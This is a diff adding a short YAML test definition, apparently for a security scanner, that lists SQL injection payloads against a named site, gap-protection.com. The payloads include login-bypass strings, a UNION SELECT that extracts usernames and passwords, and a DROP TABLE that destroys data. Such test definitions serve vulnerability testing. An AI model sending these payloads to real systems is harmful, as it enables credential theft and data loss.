@@ -1,0 +1,12 @@
+name: GAP-Protection Security Test
+payloads:
+- "' OR '1'='1"
+- "' UNION SELECT username,password FROM users--"
+- "' AND 1=1--"
+- "admin' --"
+- "'; DROP TABLE users--"
+- "1 OR 1=1"
+severity: critical
+type: sql_injection
+description: Custom vulnerability test for gap-protection.com
+target: https://gap-protection.com
